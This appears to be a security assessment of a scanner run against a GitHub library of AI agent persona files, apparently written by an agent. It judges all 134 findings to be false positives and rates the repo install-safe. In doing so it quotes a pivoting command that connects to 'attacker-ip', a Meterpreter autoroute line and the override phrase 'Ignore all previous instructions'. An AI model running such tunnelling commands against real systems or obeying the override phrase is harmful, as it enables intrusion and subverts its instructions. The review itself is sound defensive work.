# SkillSpector Security Assessment — github.com/empire-mind/agency-agents

- **Date:** 2026-09-25
- **Scanner:** SkillSpector v2.12.0 (NVIDIA), static-only (`--no-llm`, no API keys)
- **Target:** https://github.com/empire-mind/agency-agents (cloned to /tmp; scanner refused the URL directly due to an SSRF guard tripping on sandbox DNS, so the identical local clone was scanned with `--recursive`)
- **Raw reports:** `skillspector-agency-agents-2026-09-25.json` (and `.md`) in this directory
- **Method:** every finding category spot-verified against the actual file in the repo; no repo scripts were executed

## What this repo actually is

Not a SkillSpector-style skill collection — it's a **Claude Code agent-definition library**: ~325 agent persona markdown files organized by division (engineering, security, marketing, sales, …), plus installer scripts (`scripts/install.sh`, `convert.sh`), a Hermes lazy-router plugin, CI workflows, and examples. The scanner treated it as one skill (no `SKILL.md` files present). All "prompt" findings are therefore against agent persona documentation, and all "code" findings are against the local installer tooling.

## Headline numbers (after manual adjudication)

| Severity (scanner) | Scanner count | True positives | False positives |
|---|---|---|---|
| CRITICAL | 3 | 0 | 3 |
| HIGH | 58 | 0 | 58 |
| MEDIUM | 65 | 0 | 65 |
| LOW | 8 | 0 (hygiene notes only) | 8 |
| **Total** | **134** | **0** | **134** |

**Adjudicated risk: Critical 0 · High 0 · Medium 1 · Low 3.** Every scanner hit is a keyword/YARA match with no malicious substance; details below.

## The 3 CRITICALs — all false positives

1. **YARA `c2_framework_indicators` — "Meterpreter"** → `security/security-penetration-tester.md:297`
   Snippet shows `ligolo-agent -connect attacker-ip:11601` and `meterpreter> run autoroute`. This is a "Network Pivoting & Tunneling Reference" code block in a **penetration-tester agent persona** — static documentation of standard red-team techniques. No executable payload, no C2 infrastructure, nothing runs. Verdict: **false positive for malware**. Note: the file is dual-use offensive-security knowledge, which is the agent's stated purpose (red-team persona), not a supply-chain threat.
2. **YARA `c2_framework_indicators` — "CobaltStrike"** → `security/security-threat-intelligence-analyst.md`
   The match is a **defensive YARA detection rule** (`rule CobaltStrike_Beacon_Generic`) for identifying Cobalt Strike beacons — threat-intel content, the opposite of malware. Verdict: **false positive**.
3. **Prompt Injection / "Harmful Content Injection" — "botulinum"** → `specialized/healthcare-marketing-compliance.md:130`
   Marketing-compliance text about Chinese medical-aesthetics advertising law ("Products used (e.g., botulinum toxin…) must display approval numbers"). Keyword match on "botulinum". Verdict: **false positive**.

## HIGH findings — verified false positives (by category)

- **Agent Snooping (10)** — `~/.gemini/config` etc. in README.md and scripts/install.sh: these are the installer's documented destination paths for Antigravity/Gemini skills. Normal installer behavior, user-invoked.
- **Anti-Refusal (8)** — phrases like "Don't judge" (academic-historian.md), "without warning", "don't apologize", "no warning", "do not moralize", "without safeguards", "No restrictions apply": benign persona/style phrasing in agent docs, none instruct bypassing model safety.
- **Memory Poisoning (5)** — "clear state" / "Clear state" in statistician, orgscript-engineer, civil-engineer, brand-guardian docs: refers to resetting conversation/workflow state, not prompt/memory attacks.
- **Rogue Agent / Self-Modification (19)** — "self-modify" = "self-modifying AI economics" (pricing dynamics, autonomous-optimization-architect.md:100); "self-update" = dev-tooling distribution best practice (like brew self-update, developer-tooling-engineer.md:24); "plist"/"pList" = macOS property lists; `mkdir -p` in install.sh = ordinary installer.
- **Privilege Escalation (14)** — "keychain" = Apple `notarytool --keychain-profile` in a desktop-app CI snippet (desktop-app-engineer.md:123); "Access tokens" = Feishu/IAM identity docs with explicit "never hardcode secrets" guidance; `/etc/passwd` = a WASI sandbox example stating the plugin *cannot* read it (webassembly-engineer.md:91); "sudo"/"Run as root" = incident-responder runbook context.
- **Tool Misuse (5)** — `git push --force-with-lease` on the user's own branch in a rebase workflow (git-workflow-master.md:68); the convert.sh `rm -rf` match is a *comment describing the guard* (`clean_tool_output` refuses non-slug tool names; convert.sh:660-664) — the actual rm is scoped to `$OUT_DIR/<tool>` and preserves the README.
- **Data Exfiltration (10)** — `fetch('https://open.feishu.cn/open-apis/auth/v3/…')` = legitimate Feishu OAuth doc with "never hardcode `app_secret`" rules; `curl -X POST http://localhost:18060/…` = local publish-API example; splunk `curl -k -u "${{ secrets.… }}"` = doc example using env secrets; `https://api.example.com/` = placeholder.
- **Prompt Injection (12)** — "Ignore all previous instructions" in prompt-engineer.md:169 is a *test case list of adversarial inputs to defend against*; HTML comments in technical-writer.md/developer-advocate.md/agentic-search-optimizer.md are doc-template comments (`<!-- 2-3 sentences: the problem… -->`), not hidden instructions; "override system" (technical-artist.md:42) = game-engine asset override system; "post history to" = Instagram analytics phrasing (carousel-growth-engine.md:194).
- **System Prompt Leakage (2)** — "print Prompt" was a line-end truncation of "Micro-Sprint Prompts." (behavioral-nudge-engine.md:33); "return rules" = retail returns policy (retail-customer-returns.md).
- **YARA `info_stealer` ("Mimikatz")** → security-threat-detection-engineer.md: threat-intel detection reference table. False positive.

## MEDIUM findings — verified

- **Excessive Agency (24)** — "without asking/confirmation" phrasing in agent persona docs. These are style directives in markdown personas, not capabilities; actual risk depends on the host agent's tool permissions at deploy time. Not a repo defect.
- **Rogue Agent / Session Persistence (15)** — `mkdir`, crontab/systemctl in incident-responder runbook references, README install instructions. Benign.
- **MCP Rug Pull (5), analysis-evasion (1)** — scanner emitted these with *no pattern, no finding text, no snippet*; the literal strings ("rug pull", "evasion") do not occur in the attributed files. Unverifiable heuristic noise → false positives.
- **Dangerous Code Execution (1)** — `subprocess.run(["python3", "-", …])` in scripts/check-hermes-config-rewrite.py: a test harness executing a fixed heredoc against a temp config file. Not user/remote content. False positive.
- **Output Handling (1)** — "without cutting corners" phrase in strategy/runbooks.json. Noise.

## What I checked independently of the scanner

- **No `curl|bash` / `wget|bash` anywhere** in scripts or docs; no network egress in the installer.
- **No hardcoded credentials**: the only `BEGIN RSA PRIVATE KEY` hit is a secret-detection regex catalog in security-senior-secops.md; the only `apiKey` hit is `'YOUR_SEARCH_API_KEY'` placeholder.
- **No prompt-injection directives**: "ignore/disregard previous instructions" and "without user knowledge/consent" searches returned only the prompt-engineering test-case list and game-asset wording.
- **rm -rf usages**: install.sh hermes path is basename-guarded to `agency-agents-router` with an explicit refusal check (install.sh:1255-1270); convert.sh's is slug-validated (convert.sh:660-664); the rest are test sandboxes with `trap … EXIT`.
- **Workflows**: 7 CI workflows, all `actions/checkout@v4`, no secrets, no `pull_request_target`.
- **Hermes plugin python**: no `requests`/`urllib`/`socket` usage — local JSON scoring only.
- **Hermes config edit** (install.sh `ensure_hermes_plugin_enabled`): python3 heredoc rewrites the user's `config.yaml` with backup (`config.yaml.bak.agency-agents-plugin.$$`), idempotent, indent-aware. Safe but worth knowing it touches the config.

## Per-skill verdicts

This repo ships agent definitions, not executable skills; the meaningful install surface is the shell installer:

| Component | Verdict | Notes |
|---|---|---|
| Agent persona markdowns (~325) | **install-safe** | Documentation only; dual-use red-team knowledge confined to the security division's stated purpose |
| scripts/install.sh | **install-safe** | Copies agent files into 16 tools' config dirs; env-var overrides; guarded deletes; config edits backed up |
| scripts/convert.sh + check-* scripts | **install-safe** | Test/convert tooling, no network, no credentials |
| Hermes plugin (integrations/hermes) | **install-safe** | Local keyword router, no network code |
| .github/workflows | **fix-first (hygiene)** | Pin actions to SHAs; add explicit least-privilege `permissions:` blocks |
| install.sh hermes config rewrite | **fix-first (hygiene)** | Works and backs up, but consider a `--dry-run`-visible diff before rewriting user config |

## Install decision: **INSTALL-SAFE**

Zero true-positive findings across 134 scanner hits (all verified against the source files). No malware, no exfiltration, no credential material, no remote code execution, no prompt-injection payloads. The only substantive note is that the security-division agents contain dual-use offensive-security reference material — appropriate to their red-team purpose, document-only, and not a supply-chain risk. Recommended hygiene follow-ups (non-blocking): SHA-pin GitHub Actions, add workflow `permissions:`, and surface a diff before the installer rewrites `~/.hermes/config.yaml`.

## Files

- This assessment: `~/workspace/vault/security/skillspector-agency-agents-2026-09-25.md`
- Raw JSON report: `~/workspace/vault/security/skillspector-agency-agents-2026-09-25.json`
- Raw Markdown report: `~/workspace/vault/security/skillspector-agency-agents-2026-09-25-tool.md` (if generated)
